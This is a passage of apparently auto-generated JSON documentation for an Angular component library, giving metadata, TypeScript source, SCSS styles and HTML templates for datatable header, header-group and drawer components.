            "sourceCode": "import { ChangeDetectionStrategy, Component, EventEmitter, Input, Output } from '@angular/core';\nimport { Column, ColumnDisplay } from '../columns';\nimport { HeaderContextMenu } from '../events';\nimport { animate, state, style, transition, trigger, } from '@angular/animations';\n\n@Component({\n  selector: 'sto-datatable-header',\n  templateUrl: './sto-datatable-header.component.html',\n  styleUrls: ['./sto-datatable-header.component.scss'],\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  animations: [\n    trigger('sort', [\n      state('open', style({ width: '16px', opacity: 1 })),\n      transition('void => *', [\n        style({ width: 0, overflow: 'hidden', opacity: 0 }),\n        animate(150)\n      ]),\n      transition('* => void', [\n        animate(150, style({ width: 0, overflow: 'hidden', opacity: 0 }))\n      ])\n    ])\n  ]\n})\nexport class StoDatatableHeaderComponent<T = Record<string, unknown>> {\n  @Input()\n  responsive: boolean;\n  @Input()\n  smallScreen: boolean;\n  @Input()\n  headerHeight: number;\n  @Input()\n  resizeable: boolean;\n  @Input()\n  width: string;\n  @Input()\n  offset: number;\n  @Input()\n  scrollLeft: string;\n  @Input()\n  bodyHeight: number | null;\n  @Input()\n  rows: T[];\n  @Input()\n  rowHeight: number;\n  @Input()\n  columns: Column[];\n  @Input()\n  sortable: boolean;\n  @Input()\n  activeSortId: string | undefined;\n  @Input()\n  columnMode: ColumnDisplay;\n  ColumnDisplay = ColumnDisplay;\n  public tempWidth: string | null;\n\n  public headerWidthMap: Record<number, number> = {};\n\n  @Output()\n  resized = new EventEmitter<{ columns: Column[], column: Column }>();\n\n  public sortDirection: 'asc' | 'desc' | null;\n\n\n  @Output()\n  headerContextMenu = new EventEmitter<HeaderContextMenu>();\n  @Output()\n  sort = new EventEmitter<{ column: Column, sortDir: 'asc' | 'desc' | null }>();\n\n  public trackColumnsFn(index: number, item: Column) {\n    return item.$$id;\n  }\n\n  sortByColumn(column: Column) {\n    if ( !this.sortable || column.disableSort ) {\n      return;\n    }\n    if ( column.$$id === this.activeSortId && this.sortDirection === 'desc' ) {\n      this.sortDirection = null;\n    } else if ( column.$$id === this.activeSortId && this.sortDirection === 'asc' ) {\n      this.sortDirection = 'desc';\n    } else {\n      this.sortDirection = 'asc';\n    }\n    this.sort.emit({ column, sortDir: this.sortDirection });\n  }\n\n  public onResize(column: Column, flexBasis: number): void {\n    const width = 0;\n    const colIndex = this.columns.indexOf(column);\n    this.headerWidthMap[ colIndex ] = flexBasis;\n    /*    const cols = this.columns\n          .map(c => {\n            if ( c === column ) {\n              c.flexBasis = flexBasis;\n            }\n            width = width + c.flexBasis;\n            return c;\n          });*/\n    this.tempWidth = ( this.offset + width ) + 'px';\n    // this.columns = [...cols];\n  }\n\n  onResizeEnd(col: Column, flexBasis: number) {\n    // this.onResize(column, flexBasis);\n    const columns = this.columns\n      .map(c => {\n        if ( c === col ) {\n          return {\n            ...c,\n            flexBasis\n          };\n        }\n        return c;\n      });\n    this.tempWidth = null;\n    const column = { ...col, flexBasis };\n    this.resized.emit({ columns, column });\n  }\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": ".sto-mdl-table__header__row__cell {\n  display: flex;\n  align-items: center;\n\n  .mat-icon {\n    font-size: 16px;\n    line-height: 24px;\n    margin-right: 8px;\n  }\n\n  span {\n    min-width: 0;\n    overflow: hidden;\n    white-space: nowrap;\n    text-overflow: ellipsis;\n  }\n}\n\n@keyframes sort {\n\n}\n",
                    "styleUrl": "./sto-datatable-header.component.scss"
                }
            ],
            "stylesData": "",
            "templateData": "<div class=\"sto-mdl-table__header\"\n     [style.overflow-y]=\"'hidden'\"\n     [style.overflowX]=\"'hidden'\"\n     *ngIf=\"!responsive || (responsive && !smallScreen)\">\n  <div class=\"sto-mdl-table__header__row\"\n       (dragover)=\"$event.preventDefault()\"\n       [style.cursor]=\"sortable ? 'pointer' : 'auto'\"\n       [style.display]=\"columnMode === ColumnDisplay.Flex ? 'flex' : 'block'\"\n       [style.height]=\"headerHeight + 'px'\"\n       [style.min-width]=\"tempWidth || width\"\n       [style.transform]=\"scrollLeft\"\n       [style.overflow]=\"'hidden'\"\n       [class.sto-mdl-table__row--scroll-offset]=\"!!bodyHeight && (rows?.length || 1) * rowHeight > bodyHeight\">\n    <div class=\"sto-mdl-table__header__row__cell\"\n         (click)=\"sortByColumn(column)\"\n         (contextmenu)=\"headerContextMenu.emit({event: $event, column: column})\"\n         [ngClass]=\"column.headerClass | exec:column\"\n         [ngStyle]=\"column | columnStyle:columnMode:(resize.width$ | async)\"\n         *ngFor=\"let column of columns; let i = index; trackBy: trackColumnsFn\">\n      <mat-icon [@sort]=\"activeSortId === column.$$id ? 'open' : 'close'\"\n                [title]=\"sortDirection === 'desc' ? 'DESC' : 'ASC'\"\n                *ngIf=\"activeSortId === column.$$id\">\n        {{ activeSortId === column.$$id && sortDirection === 'desc' ? 'arrow_downward' : 'arrow_upward' }}\n      </mat-icon>\n      <span *ngIf=\"!column.headerTemplate\"\n            class=\"sto-mdl-table__header__row__cell__content\"\n            [title]=\"column.name\">{{ column.name || '' }}</span>\n      <ng-template #headerTemplate\n                   *ngIf=\"column.headerTemplate\"\n                   [ngTemplateOutlet]=\"column.headerTemplate\"\n                   [ngTemplateOutletContext]=\"{column: column}\">\n      </ng-template>\n      <span [style.height.px]=\"headerHeight - 4\"\n            (click)=\"$event.stopPropagation();\"\n            stoDatatableResize\n            #resize=\"stoDatatableResize\"\n            [column]=\"column\"\n            [style.display]=\"resizeable && !column.disableResize ? 'inherit' : 'none'\"\n            (resizeEnd)=\"onResizeEnd(column, $event)\"\n            (resize)=\"onResize(column, $event)\">\n        <span style=\"width: 1px; height: 100%; margin: auto\"></span>\n      </span>\n    </div>\n  </div>\n</div>\n"
        },
        {
            "name": "StoDatatableHeaderGroupComponent",
            "id": "component-StoDatatableHeaderGroupComponent-c9be9c818bf2f36abd8dec410fb92fbb",
            "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-header-group/sto-datatable-header-group.component.ts",
            "changeDetection": "ChangeDetectionStrategy.OnPush",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-datatable-header-group",
            "styleUrls": [
                "./sto-datatable-header-group.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./sto-datatable-header-group.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "columns",
                    "line": 20,
                    "type": "Column[]"
                },
                {
                    "name": "groups",
                    "line": 12,
                    "type": "ColumnGroup[]"
                },
                {
                    "name": "height",
                    "line": 14,
                    "type": "number"
                },
                {
                    "name": "transform",
                    "line": 18,
                    "type": "string"
                },
                {
                    "name": "width",
                    "line": 16,
                    "type": "string"
                }
            ],
            "outputsClass": [],
            "propertiesClass": [],
            "methodsClass": [
                {
                    "name": "ngOnChanges",
                    "args": [
                        {
                            "name": "changes",
                            "type": "SimpleChanges"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 33,
                    "jsdoctags": [
                        {
                            "name": "changes",
                            "type": "SimpleChanges",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "testOffset",
                    "args": [
                        {
                            "name": "group",
                            "type": "ColumnGroup"
                        }
                    ],
                    "optional": false,
                    "returnType": "string",
                    "typeParameters": [],
                    "line": 22,
                    "jsdoctags": [
                        {
                            "name": "group",
                            "type": "ColumnGroup",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "hostBindings": [],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import { ChangeDetectionStrategy, Component, Input, OnChanges, SimpleChanges } from '@angular/core';\nimport { Column, ColumnGroup } from '../columns';\n\n@Component({\n  selector: 'sto-datatable-header-group',\n  templateUrl: './sto-datatable-header-group.component.html',\n  styleUrls: [ './sto-datatable-header-group.component.scss' ],\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class StoDatatableHeaderGroupComponent implements OnChanges {\n  @Input()\n  groups: ColumnGroup[];\n  @Input()\n  height: number;\n  @Input()\n  width: string;\n  @Input()\n  transform: string;\n\n  @Input() columns: Column[];\n\n  testOffset(group: ColumnGroup) {\n    if ( !this.columns ) {\n      return '';\n    }\n    const { columnStart } = group;\n    const slice = this.columns.slice(0, columnStart);\n    let transform = 0;\n    slice.forEach(col => transform = transform + ( col.flexBasis || 80 ));\n    return `translateX(${transform + 8}px)`;\n  }\n\n  ngOnChanges(changes: SimpleChanges): void {\n    if ( changes.groups || changes.columns ) {\n      const groups: ColumnGroup[] = changes.groups ? changes.groups.currentValue : this.groups;\n      const columns = changes.columns ? changes.columns.currentValue : this.columns;\n      if ( groups && columns ) {\n        groups.forEach(group => {\n          group.transform = this.testOffset(group);\n        });\n      }\n    }\n  }\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": ":host {\n  display: block;\n  overflow: hidden;\n}\n",
                    "styleUrl": "./sto-datatable-header-group.component.scss"
                }
            ],
            "stylesData": "",
            "implements": [
                "OnChanges"
            ],
            "templateData": "<div [style.height.px]=\"height\"\n     [style.min-width]=\"width\"\n     [style.transform]=\"transform\"\n     class=\"sto-mdl-table__header-group\">\n  <div *ngFor=\"let group of groups\"\n       [style.transform]=\"group.transform\"\n       class=\"sto-mdl-table__header-group__cell\">\n    {{ group.name }}\n  </div>\n</div>\n"
        },
        {
            "name": "StoDrawerComponent",
            "id": "component-StoDrawerComponent-0c31ad3ef77efd7682418237d7a27772",
            "file": "libs/drawer/src/lib/sto-drawer/sto-drawer.component.ts",
            "changeDetection": "ChangeDetectionStrategy.OnPush",
            "encapsulation": [
                "ViewEncapsulation.None"
            ],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-drawer",
            "styleUrls": [
                "./sto-drawer.component.scss",
                "../sto-navigation/_sto-navigation.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./sto-drawer.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "animation",
                    "line": 145,
                    "type": "boolean"
                },
                {
                    "name": "backdrop",
                    "line": 147,
                    "type": "boolean"
                },
                {
                    "name": "closeOnClick",
                    "description": "<p>If the drawer should close when clicked outside the drawer.</p>\n",
                    "line": 123,
                    "type": "boolean"
                },
                {
                    "name": "cssClass",
                    "description": "<p>Additional css class(es) as a string e.g &#39;sto-drawer--xmas&#39;.</p>\n",
                    "line": 119,
                    "type": "string"
                },
                {
                    "name": "ignoreEscKey",
                    "defaultValue": "false",
                    "description": "<p>Esc key closed by default the drawer, this overrides that behaviour.\nDefault false.</p>\n",
                    "line": 129
                },
                {
                    "name": "offset",
                    "defaultValue": "'0'",
                    "description": "<p>Offset (space) between the viewPanel right and the drawer in pixels\nBinds to the right style property.\nUsed for multiple drawers where the offset would be the widht of the allready opened drawer.\nDefault 0.</p>\n",
                    "line": 104
                },
                {
                    "name": "open",
                    "description": "<p>If the drawer is opened.</p>\n",
                    "line": 80,
                    "type": "boolean"
                },
                {
                    "name": "padding",
                    "defaultValue": "'0px'",
                    "description": "<p>Offset (space) between the viewPanel top and the drawer in pixels.\nBinds to the top style property.\nDefault 0.</p>\n",
                    "line": 110
                },
                {
                    "name": "position",
                    "description": "<p>Position of the drawer as a string\nLeft or right. Default right.</p>\n",
                    "line": 115,
                    "type": "\"left\" | \"right\""
                },
                {
                    "name": "width",
                    "defaultValue": "'300px'",
                    "description": "<p>The width of the drawer in as a string (pixels: &#39;600px&#39;, presentage: &#39;33%&#39;, or viewPort:&#39;30vw&#39;)\nDefault &#39;25vw&#39;</p>\n",
                    "line": 138
                }
            ],
            "outputsClass": [
                {
                    "name": "cancel",
                    "defaultValue": "new EventEmitter()",
                    "description": "<p>Emits on cancel. When the cancel is called by pressing ESC key.\n  {EventEmitter<any>}</p>\n",
                    "line": 167,
                    "type": "EventEmitter"
                },
                {
                    "name": "onClose",
                    "defaultValue": "new EventEmitter()",
                    "description": "<p>Emits on close.</p>\n",
                    "line": 157,
                    "type": "EventEmitter"
                },
                {
                    "name": "onOpen",
                    "defaultValue": "new EventEmitter()",
                    "description": "<p>Emits on open.</p>\n",
                    "line": 161,
                    "type": "EventEmitter"
                },
                {
                    "name": "onToggle",
                    "defaultValue": "new EventEmitter<boolean>()",
                    "description": "<p>Emits true if opened, false if closed.\n  {EventEmitter<boolean>}</p>\n",
                    "line": 153,
                    "type": "EventEmitter"
                },
                {
                    "name": "submit",
                    "defaultValue": "new EventEmitter()",
                    "description": "<p>Emits on submit. When the submit is called from code like CTRL+S.\n  {EventEmitter<any>}</p>\n",
                    "line": 172,
                    "type": "EventEmitter"
                }
            ],
            "propertiesClass": [
                {
                    "name": "_open",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 131,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "footer",
                    "type": "ElementRef<HTMLElement>",
                    "optional": false,
                    "description": "",
                    "line": 178,
                    "decorators": [
                        {
                            "name": "ContentChild",
                            "stringifiedArguments": "StoDrawerFooterComponent, {read: ElementRef}"
                        }
                    ]
                },
                {
                    "name": "headerRef",
                    "type": "ElementRef",
                    "optional": false,
                    "description": "",
                    "line": 176,
                    "decorators": [
                        {
                            "name": "ViewChild",
                            "stringifiedArguments": "'header'"
                        }
                    ]
                },
                {
                    "name": "height",
                    "defaultValue": "'100%'",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 174,
                    "modifierKind": [
                        114
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "closeDrawer",
                    "args": [
                        {
                            "name": "emit",
                            "type": "",
                            "defaultValue": "true"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 251,
                    "modifierKind": [
                        114
                    ],
                    "jsdoctags": [
                        {
                            "name": "emit",
                            "type": "",
                            "defaultValue": "true",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "isAnActiveOverlayPresent",
                    "args": [],
                    "optional": false,
                    "returnType": "boolean",
                    "typeParameters": [],
                    "line": 222,
                    "description": "<p>Test if an active overlay is active by checkout for cdk-overlay-containeres that are active.\nThis indicates a select-list, dialog or menu is opened.\ntrue if an active overlay is present in the DOM.</p>\n",
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "ngAfterViewInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 286
                },
                {
                    "name": "ngOnInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 280
                },
                {
                    "name": "openDrawer",
                    "args": [
                        {
                            "name": "emit",
                            "type": "",
                            "defaultValue": "true"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 259,
                    "modifierKind": [
                        114
                    ],
                    "jsdoctags": [
                        {
                            "name": "emit",
                            "type": "",
                            "defaultValue": "true",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "resizeContent",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 266,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "testKeyCombos",
                    "args": [
                        {
                            "name": "ev",
                            "type": "KeyboardEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 194,
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": "ev",
                            "type": "KeyboardEvent",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "testSingleKeys",
                    "args": [
                        {
                            "name": "ev",
                            "type": "KeyboardEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 206,
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": "ev",
                            "type": "KeyboardEvent",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "toggle",
                    "args": [
                        {
                            "name": "emit",
                            "type": "",
                            "defaultValue": "true"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 240,
                    "modifierKind": [
                        114
                    ],
                    "jsdoctags": [
                        {
                            "name": "emit",
                            "type": "",
                            "defaultValue": "true",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "hostBindings": [
                {
                    "name": "style.height.vh",
                    "defaultValue": "100",
                    "line": 142
                }
            ],
            "hostListeners": [
                {
                    "name": "document:keydown",
                    "args": [
                        {
                            "name": "event",
                            "type": "KeyboardEvent"
                        }
                    ],
                    "argsDecorator": [
                        "$event"
                    ],
                    "line": 185
                },
                {
                    "name": "window:resize",
                    "args": [],
                    "argsDecorator": [
                        "$event"
                    ],
                    "line": 235
                }
            ],
            "description": "<p>A sidebar navigation commonly referred as a drawer that animates from the left or right side of the viewport.</p>\n",
            "rawdescription": "A sidebar navigation commonly referred as a drawer that animates from the left or right side of the viewport.",
            "type": "component",
            "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectionStrategy,\n  ChangeDetectorRef,\n  Component,\n  ContentChild,\n  ElementRef,\n  EventEmitter,\n  HostBinding,\n  HostListener,\n  Input,\n  OnInit,\n  Output,\n  ViewChild,\n  ViewEncapsulation\n} from '@angular/core';\nimport { Key } from '@ngx-stoui/core';\nimport { animate, group, state, style, transition, trigger } from '@angular/animations';\nimport { StoDrawerFooterComponent } from './sto-drawer-footer.component';\n\n/**\n * A sidebar navigation commonly referred as a drawer that animates from the left or right side of the viewport.\n */\n@Component({\n  selector: 'sto-drawer',\n  templateUrl: './sto-drawer.component.html',\n  styleUrls: [ './sto-drawer.component.scss', '../sto-navigation/_sto-navigation.scss' ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  animations: [\n    trigger('drawerAnimations', [\n      state('open-left', style({ transform: 'translateX(0)', opacity: 1 })),\n      state('open-right', style({ transform: 'translateX(0)', opacity: 1 })),\n      state('openImmediate', style({ transform: 'translateX(0)', opacity: 1 })),\n      state('closedImmediate-left', style({ transform: 'translateX(-100%)', opacity: 0 })),\n      state('closedImmediate-right', style({ transform: 'translateX(100%)', opacity: 0 })),\n      state('closed-left', style({ transform: 'translateX(-100%)', opacity: 0 })),\n      state('closed-right', style({ transform: 'translateX(100%)', opacity: 0 })),\n      transition('* => closed-left', [\n        group([\n          animate('400ms ease-in-out', style({ transform: 'translateX(-100%)' })),\n          animate('1ms 400ms ease', style({ opacity: 0 }))\n        ])\n      ]),\n      transition('* => closed-right', [\n        group([\n          animate('400ms ease-in-out', style({ transform: 'translateX(100%)' })),\n          animate('1ms 400ms ease', style({ opacity: 0 }))\n        ])\n      ]),\n      transition('* => open-left', [\n        style({ transform: 'translateX(-100%)', opacity: 1 }),\n        animate('400ms ease-in-out')\n      ]),\n      transition('* => open-right', [\n        style({ transform: 'translateX(100%)', opacity: 1 }),\n        animate('400ms ease-in-out')\n      ]),\n    ]),\n    trigger('overlay', [\n      transition(':enter', [\n        style({ opacity: 0 }),\n        animate('400ms', style({ opacity: 0.08 })),\n      ]),\n      transition(':leave', [\n        animate('400ms', style({ opacity: 0 }))\n      ])\n    ])\n  ]\n})\n\nexport class StoDrawerComponent implements OnInit, AfterViewInit {\n\n  /**\n   * If the drawer is opened.\n   */\n  @Input()\n  @HostBinding('class.open')\n  get open(): boolean {\n    return this._open;\n  }\n\n  set open(open: boolean) {\n    this._open = open;\n    this.onOpen.emit(open);\n    this.cdr.detectChanges();\n  }\n\n  // @HostBinding('@drawerAnimations')\n  get slideInOut() {\n    if ( !this.animation ) {\n      return this.open ? 'openImmediate' : `closedImmediate-${this.position}`;\n    }\n    return this.open ? `open-${this.position}` : `closed-${this.position}`;\n  }\n\n  /**\n   * Offset (space) between the viewPanel right and the drawer in pixels\n   * Binds to the right style property.\n   * Used for multiple drawers where the offset would be the widht of the allready opened drawer.\n   * Default 0.\n   */\n  @Input() offset = '0';\n  /**\n   * Offset (space) between the viewPanel top and the drawer in pixels.\n   * Binds to the top style property.\n   * Default 0.\n   */\n  @Input() padding = '0px';\n  /**\n   * Position of the drawer as a string\n   * Left or right. Default right.\n   */\n  @Input() position: 'left' | 'right';\n  /**\n   * Additional css class(es) as a string e.g 'sto-drawer--xmas'.\n   */\n  @Input() cssClass: string;\n  /**\n   * If the drawer should close when clicked outside the drawer.\n   */\n  @Input() closeOnClick: boolean;\n\n  /**\n   * Esc key closed by default the drawer, this overrides that behaviour.\n   * Default false.\n   */\n  @Input() ignoreEscKey = false;\n\n  private _open: boolean;\n\n  /**\n   * The width of the drawer in as a string (pixels: '600px', presentage: '33%', or viewPort:'30vw')\n   * Default '25vw'\n   */\n  @Input() @HostBinding('style.width')\n  width = '300px';\n\n  // I don't see what harm this can do, the drawer should always be full height..\n  @HostBinding('style.height.vh')\n  h = 100;\n\n  @Input()\n  animation: boolean;\n  @Input()\n  backdrop: boolean;\n\n  /**\n   * Emits true if opened, false if closed.\n   *  {EventEmitter<boolean>}\n   */\n  @Output() onToggle = new EventEmitter<boolean>();\n  /**\n   * Emits on close.\n   */\n  @Output() onClose = new EventEmitter();\n  /**\n   * Emits on open.\n   */\n  @Output() onOpen = new EventEmitter();\n\n  /**\n   * Emits on cancel. When the cancel is called by pressing ESC key.\n   *  {EventEmitter<any>}\n   */\n  @Output() cancel = new EventEmitter();\n  /**\n   * Emits on submit. When the submit is called from code like CTRL+S.\n   *  {EventEmitter<any>}\n   */\n  @Output() submit = new EventEmitter();\n\n  public height = '100%';\n\n  @ViewChild('header') headerRef: ElementRef;\n  @ContentChild(StoDrawerFooterComponent, { read: ElementRef })\n  footer: ElementRef<HTMLElement>;\n\n  constructor(private el: ElementRef, private cdr: ChangeDetectorRef) {\n  }\n\n\n  @HostListener('document:keydown', [ '$event' ])\n  handleKeyboardEvent(event: KeyboardEvent) {\n    if ( event.ctrlKey || event.altKey || event.shiftKey ) {\n      this.testKeyCombos(event);\n    } else {\n      this.testSingleKeys(event);\n    }\n  }\n\n\n  private testKeyCombos(ev: KeyboardEvent) {\n    // eslint-disable-next-line @typescript-eslint/no-explicit-any\n    const path: HTMLElement[] = ( ev as any ).path;\n    // Test to ensure we have focus inside the drawer\n    if ( !( path && path.includes(this.el.nativeElement) ) ) {\n      return;\n    }\n    if ( ev.ctrlKey && ev.keyCode === Key.Enter ) {\n      this.submit.emit();\n    }\n  }\n\n  private testSingleKeys(ev: KeyboardEvent) {\n    if ( ev.keyCode !== Key.Escape || this.ignoreEscKey ) {\n      return;\n    }\n    const isNotInsideAMenu = !this.isAnActiveOverlayPresent();\n    if ( isNotInsideAMenu ) {\n      this.closeDrawer();\n      this.cancel.emit();\n    }\n  }\n\n  /**\n   * Test if an active overlay is active by checkout for cdk-overlay-containeres that are active.\n   * This indicates a select-list, dialog or menu is opened.\n   * true if an active overlay is present in the DOM.\n   */\n  private isAnActiveOverlayPresent(): boolean {\n    const overlays: Array<Element> = Array.from(document.getElementsByClassName('cdk-overlay-container'))\n      .filter(overlay => !!overlay)\n      .filter(overlay => overlay.children.length > 0)\n      .map(overlay => Array.from(overlay.children))\n      .flat();\n    const overlaysActive = overlays\n      .map(el => el.innerHTML)\n      .filter(content => !!content || content !== '');\n    return overlaysActive.length !== 0;\n  }\n\n  @HostListener('window:resize', [ '$event' ])\n  onWindowResize() {\n    this.resizeContent();\n  }\n\n\n  public toggle(emit = true) {\n    if ( emit ) {\n      this.onToggle.emit(!this.open);\n    }\n    if ( !this.open ) {\n      this.openDrawer(emit);\n    } else {\n      this.closeDrawer(emit);\n    }\n  }\n\n  public closeDrawer(emit = true) {\n    this.open = false;\n    this.cdr.detectChanges();\n    if ( emit ) {\n      this.onClose.emit();\n    }\n  }\n\n  public openDrawer(emit = true) {\n    this.open = true;\n    if ( emit ) {\n      this.onOpen.emit();\n    }\n  }\n\n  private resizeContent() {\n    if ( this.open ) {\n      const hasFooter = this.footer;\n      const totalHeight: number = this.el?.nativeElement.offsetHeight;\n      let footerHeight = 0;\n\n      const headerHeight = this.headerRef?.nativeElement.offsetHeight;\n      if ( hasFooter ) {\n        footerHeight = this.footer?.nativeElement.offsetHeight;\n      }\n      this.height = `${totalHeight - footerHeight - headerHeight}px`;\n    }\n  }\n\n  ngOnInit() {\n    if ( !this.position ) {\n      this.position = 'left';\n    }\n  }\n\n  ngAfterViewInit() {\n    setTimeout(() => this.resizeContent());\n  }\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": "@use '~@angular/material' as mat;\n\n\n\n$header-height: 74px;\n$large-header-height: 24 * 4px;\n$footer-height: 16 * 4px;\n$header-size: 20px;\n.large-header {\n  .sto-drawer__content {\n    height: calc(100% - calc(#{$large-header-height} + #{$footer-height}));\n  }\n\n  .sto-drawer__header {\n    line-height: 30px;\n    height: $large-header-height;\n  }\n}\n\n\n\n.sto-drawer {\n  transition: right 400ms ease-in-out;\n  @include mat.elevation(16);\n  position: fixed;\n  top: 0;\n  bottom: 0;\n  width: 20%;\n  min-width: 260px;\n  padding-top: $header-height;\n\n  &.right {\n    min-width: 450px;\n  }\n\n  z-index: 30;\n\n  &.right {\n    left: auto;\n    right: 0;\n  }\n\n  &.left {\n    left: 0;\n    right: auto;\n  }\n\n  &__content {\n    padding: 2 * 4px;\n    overflow-y: auto;\n    overflow-x: hidden;\n\n    &.navigation {\n      height: 100%;\n    }\n  }\n\n  &__footer {\n    @include mat.elevation(4);\n    position: absolute;\n    bottom: 0;\n    left: 0;\n    padding: 2 * 4px;\n    width: 100%;\n\n    height: calc(#{$footer-height} - 4 * 4px);\n\n    button {\n      text-transform: uppercase;\n    }\n\n    &__more {\n      float: right;\n    }\n  }\n\n  &__header {\n    display: flex;\n    align-items: center;\n    width: 100%;\n\n    .sto-main-icon {\n      height: 40px;\n      width: 40px;\n      margin: 6px 0 0 16px;\n    }\n\n    &__title, h1, h2, h3, h4 {\n      margin: 0;\n      padding-left: 16px;\n    }\n\n    &__suffix {\n      width: 100%;\n      text-align: right;\n      min-width: 56px;\n      //color: $white-87;\n    }\n\n    &__infix {\n      min-width: 56px;\n\n      //color: $white;\n    }\n\n    button.mat-icon-button {\n      margin: 0 8px;\n      border: 0;\n      outline: none;\n      cursor: pointer;\n\n    }\n\n    &__wrapper {\n      @include mat.elevation(4);\n      position: absolute;\n      top: 0;\n      z-index: 1;\n      padding: 0;\n      display: flex;\n      box-sizing: border-box;\n      width: 100%;\n      height: $header-height;\n      flex-direction: row;\n      align-items: center;\n      white-space: nowrap;\n\n    }\n  }\n}\n\n.large-header {\n  .sto-drawer {\n    padding-top: $large-header-height;\n  }\n}\n\n.sto-navigation{\n  .mat-list {\n    .mat-subheader {\n      padding: 8px;\n    }\n  }\n}\n\n.sto-drawer__overlay {\n  position: fixed;\n  top: 0;\n  height: 100vh;\n  width: 100vw;\n  z-index: 57;\n  opacity: 0.08;\n}\n\n@import \"sto-drawer-tabs.component\";\n",
                    "styleUrl": "./sto-drawer.component.scss"
                },
                {
                    "data": ".sto-drawer {\n  .sto-slide-panel {\n    margin: -8px;\n\n    .mat-list {\n      &.sto-navigation {\n\n        .mat-divider {\n          margin-top: 15px;\n          margin-bottom: 16px;\n        }\n\n        padding: 8px 0 0 0;\n\n        .mat-list-item {\n          padding: 0;\n          cursor: pointer;\n          font-weight: 500;\n\n          .mat-button {\n            @extend %list-item-properties;\n          }\n\n          .sto-navigation__item__text a {\n            text-decoration: none;\n            font-weight: 500;\n          }\n\n          .sto-navigation__suffix {\n            padding: 12px 0;\n            margin-right: 16px;\n            float: right;\n            line-height: 0;\n\n            .mat-icon {\n              padding: 0;\n              width: 24px;\n            }\n          }\n\n          .mat-list-item-content {\n            padding: 0;\n          }\n\n          .mat-icon {\n            padding: 0px 32px 0px 16px;\n            line-height: 24px;\n\n            svg {\n              opacity: 0.54;\n            }\n          }\n        }\n      }\n    }\n\n    .sto-navigation__backdrop {\n      position: fixed;\n      top: 0;\n      right: 0;\n      bottom: 0;\n      left: 0;\n      transition: opacity 0.4s ease-in-out;;\n      transform: translate(0);\n      opacity: 0.25;\n      cursor: pointer;\n      background: black;\n      z-index: 59;\n    }\n\n    .sto-navigation__backdrop--hidden {\n      transform: translate(9999px);\n      opacity: 0;\n    }\n\n    // dropdown\n    .mat-list.sto-navigation {\n\n      .mat-expansion-panel.sto-navigation__dropdown {\n        box-shadow: none;\n        background-color: transparent;\n      }\n\n      .mat-expansion-panel-header.sto-navigation__dropdown__header {\n        padding: 0;\n      }\n\n      .mat-expansion-panel-header-title.sto-navigation__dropdown__title {\n        @extend %list-item-properties;\n      }\n\n      .mat-expansion-indicator {\n        margin-right: 24px;\n        float: right;\n        line-height: 0;\n\n        &:after {\n          padding: 4px;\n        }\n      }\n\n      .mat-expansion-panel-body {\n        padding: 0;\n\n        .sto-navigation__item__text {\n          padding-left: 16px;\n          font-weight: normal;\n        }\n      }\n\n      .sto-navigation__prefix {\n        display: inline-block;\n        padding: 12px 35px 0 16px;\n        line-height: 0;\n      }\n    }\n\n    .mat-list.sto-list__navigation {\n      padding-top: 0;\n      margin: 0 2px;\n\n      .mat-subheader {\n        padding: 0 4px;\n      }\n\n      .mat-list-item {\n        border-top-left-radius: 4px;\n        border-top-right-radius: 4px;\n      }\n    }\n\n    .mat-icon-button.sto-list__navigation__button {\n\n      &:hover {\n      }\n    }\n\n  }\n}\n\n%list-item-properties {\n  width: 100%;\n  text-transform: none;\n  text-align: left;\n  padding: 0;\n  margin: 0;\n  line-height: 48px;\n  cursor: pointer;\n}\n",
                    "styleUrl": "../sto-navigation/_sto-navigation.scss"
                }
            ],
            "stylesData": "",
            "constructorObj": {
